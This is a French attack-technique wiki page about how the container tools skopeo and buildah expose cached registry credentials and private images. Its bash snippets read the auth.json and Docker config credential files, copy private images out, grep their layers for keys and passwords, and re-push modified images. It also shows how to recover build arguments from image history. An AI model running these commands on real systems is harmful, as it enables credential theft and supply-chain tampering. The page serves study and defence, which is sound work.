---
title: "skopeo et buildah : exposition des outils de transport d'images et de build"
description: "skopeo déplace et inspecte des images entre registres et stockage local, et buildah construit des images sans démon. Tous deux lisent les mêmes identifiants de registre que Podman et tous deux touchent au contenu des registres et aux entrées de build, ils exposent donc les identifiants stockés, permettent d'inspecter et de copier des images privées, et portent les risques de secrets au moment du build et de contexte de tout constructeur d'images."
keywords:
  - skopeo
  - buildah
  - identifiants de registre
  - inspection d'image
  - secrets de build
---

# skopeo et buildah

`skopeo` et `buildah` sont les outils d'images de l'écosystème Podman : skopeo inspecte et copie des images entre registres et stockages locaux sans les tirer dans un runtime, et buildah construit des images sans démon. Tous deux s'authentifient auprès des registres en utilisant les mêmes identifiants stockés que Podman, et tous deux manipulent le contenu des registres et les entrées de build, ils exposent donc deux choses à un attaquant capable de les exécuter : les identifiants de registre en cache, et la capacité d'inspecter, copier et construire des images privées.

## Exposition des identifiants et des images avec skopeo

```bash
# skopeo reads the same auth file Podman/Docker write
cat /run/user/$(id -u)/containers/auth.json ~/.docker/config.json 2>/dev/null
# inspect a private image's config and layers without pulling it
skopeo inspect --config docker://<registry>/<private-repo>:<tag>
# copy a private image out for offline layer mining
skopeo copy docker://<registry>/<private-repo>:<tag> dir:/tmp/img
grep -rIE 'AKIA|PRIVATE KEY|password' /tmp/img 2>/dev/null
# re-push a modified image (if the credential has write scope)
skopeo copy dir:/tmp/img docker://<registry>/<private-repo>:<tag>
```

Les commandes `inspect` et `copy` de skopeo atteignent le contenu du registre avec ce que permet l'identifiant stocké, donc un `auth.json` lisible devient un accès aux images privées et, avec une portée d'écriture, un push.

## Exposition au build avec buildah

```bash
# buildah builds carry the same build-arg and context risks as docker build
buildah bud --build-arg TOKEN=... -t img .            # TOKEN persists in history
buildah inspect img | jq '.OCIv1.history'             # recover baked build args
# buildah runs build steps as the invoking user (rootless) or root
```

## Notes d'exploitation

- Le fichier `auth.json` partagé est le pivot : il contient des identifiants de registre en base64 que skopeo utilise, donc le lire donne un accès au registre privé sans aucune attaque côté registre.
- Un `skopeo copy` vers une disposition locale `dir:` ou `oci:` est la façon propre de tirer une image privée pour [l'extraction de secrets dans les couches](../docker/images-and-registries/secrets-in-image-layers.md) sans runtime.
- Les builds buildah présentent la même fuite de build-arg et la même exposition de gestion de contexte que les builds Docker ; voir [Fuite de secret via build-arg](../docker/build-time/build-arg-secret-leak.md) et [RCE BuildKit](../docker/build-time/buildkit-rce.md) pour les risques équivalents.

## Outils

- [skopeo](https://github.com/containers/skopeo)
- [buildah](https://github.com/containers/buildah)

## Références

- [skopeo documentation](https://github.com/containers/skopeo/blob/main/docs/skopeo.1.md)
- [buildah documentation](https://docs.podman.io/en/latest/markdown/podman-build.1.html)
